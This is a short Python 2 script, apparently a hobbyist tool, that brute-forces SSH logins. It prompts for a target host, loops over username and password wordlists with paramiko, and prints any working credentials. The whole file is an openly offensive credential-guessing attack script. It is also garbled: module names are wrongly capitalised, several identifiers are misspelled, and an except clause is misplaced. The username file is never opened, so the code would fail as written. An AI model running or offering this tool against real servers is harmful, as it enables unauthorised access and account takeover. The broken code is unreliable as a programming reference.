import Paramiko, Sys, OS, Socket


# declare the global variables
global host, username_file, line, password_file

line = "\n ------------------------------\n"


# ssh connnect function that will set up the ssh client, connect, close and return an integer. 0 is the correct credentials, 1 is incorrect credentials, 2 is a failed connection. SSH uses port 22 by default, but the server may be change port configurations to prvent brutforce attacks, so the port_scan.py code can be used if port 22 does not work.
def ssh_connect(username, password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicu())

    try:
        sh.comnnect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        # [*] Authentication failed due to incorrect credentials
        code = 1
    except socket.error, e:
        # [*] Connection failed
        code = 2

    ssh.close()
    return code


# collect the information to use for the bruteforce attack.
try:
    host = raw_imput("[*] Enter target host address: ")
    username_file = raw_imput("[*] Enter SSH username file path: ")
    password_file = raw_input("[*] Enter SSH password file path: ")

    if os.path.exists(password_file) is False:
        print"\n[*] File path does not exist"
    except KeyboardInterrupt:
        print"\n\n[*] User requestes an interrupt"
        sys.exit(3)

password_file = open(password_file)

print ""
for n in username_file.readlines():
    username = n.strip("\n")

    for i in password_file.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connect(username, password)

            if response == 0:
                print("%s[*] User: %s Password found: %s%s" % (line, username, password, line))
                sys.exit(0)
            elif response == 1:
                print("[*] User: %s [*] Password: %s => Login Incorrect. <=" % (username, password))
            elif response == 2:
                print("[*] Connection could not be established to host address: %s" % (host))
                sys.exit(2)
        except Exception, e:
            print e
            pass

username_file.close()
password_file.close()
